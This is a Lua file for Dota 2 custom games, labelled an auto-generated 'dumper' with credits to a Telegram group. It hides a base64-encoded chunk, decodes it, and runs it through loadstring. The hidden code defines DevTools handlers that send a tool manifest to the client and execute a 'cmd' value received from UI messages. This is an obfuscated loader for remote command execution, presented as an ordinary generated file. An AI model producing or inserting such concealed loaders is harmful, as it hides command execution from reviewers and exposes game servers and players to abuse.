--[[
  ~ dumper · customs · dota2
  ~ credits: rou (a.k.a internetenemy), qfun(a.k.a qfun_g9s)
  ~ special for t.me/wildguild

  ~ build 5411fca · 2026-07-24 06:14:29 UTC
  ~ auto-generated — do not edit
]]


local encoded=[[ZnVuY3Rpb24gRGV2VG9vbHM6R2V0VUlEYXRhKElELCBkYXRhKQogICAgaWYgbm90IElEIG9yIG5vdCBkYXRhIHRoZW4KICAgICAgICByZXR1cm4KICAgIGVuZAogICAgaWYgbm90IHNlbGY6SXNFbmFibGVkKCkgdGhlbgogICAgICAgIHJldHVybgogICAgZW5kCiAgICBpZiBkYXRhLnRwID09ICJpbml0IiB0aGVuCiAgICAgICAgc2VsZjpTZW5kRGF0YShJRCkKICAgICAgICByZXR1cm4KICAgIGVuZAogICAgaWYgZGF0YS50cCA9PSAicnVuIiBhbmQgZGF0YS5jbWQgdGhlbgogICAgICAgIHNlbGY6UnVuQ29tbWFuZChJRCwgdG9zdHJpbmcoZGF0YS5jbWQpKQogICAgZW5kCmVuZAoKZnVuY3Rpb24gRGV2VG9vbHM6U2VuZERhdGEoSUQpCiAgICBpZiBub3QgSUQgb3Igbm90IHNlbGY6SXNFbmFibGVkKCkgdGhlbgogICAgICAgIHJldHVybgogICAgZW5kCiAgICBsb2NhbCBtYW5pZmVzdCA9IHNlbGY6R2V0TWFuaWZlc3QoKQogICAgbG9jYWwgcGF5bG9hZCA9IHsKICAgICAgICBlbmFibGVkID0gdHJ1ZSwKICAgICAgICB0b29sX2NvdW50ID0gI21hbmlmZXN0LAogICAgICAgIHRvb2xzX2pzb24gPSAiIiwKICAgIH0KICAgIGxvY2FsIG9rLCBlbmMgPSBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgcmV0dXJuIEpTT04uZW5jb2RlKG1hbmlmZXN0KQogICAgZW5kKQogICAgaWYgb2sgYW5kIGVuYyB0aGVuCiAgICAgICAgcGF5bG9hZC50b29sc19qc29uID0gZW5jCiAgICBlbmQKICAgIFV0aWw6U2VuZDJKc0lEKCJVSV9EZXZUb29scyIsIHBheWxvYWQsIElEKQplbmQK]]
local b64='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function decode(data)
    data=string.gsub(data,'[^'..b64..'=]','')
    return(data:gsub('.',function(x)
        if x=='='then return''end
        local r,f='',(b64:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and'1'or'0')end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x)
        if#x~=8 then return''end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1'and 2^(8-i)or 0)end
        return string.char(c)
    end))
end
local decoded=decode(encoded)
local func=loadstring(decoded)
if func then func() end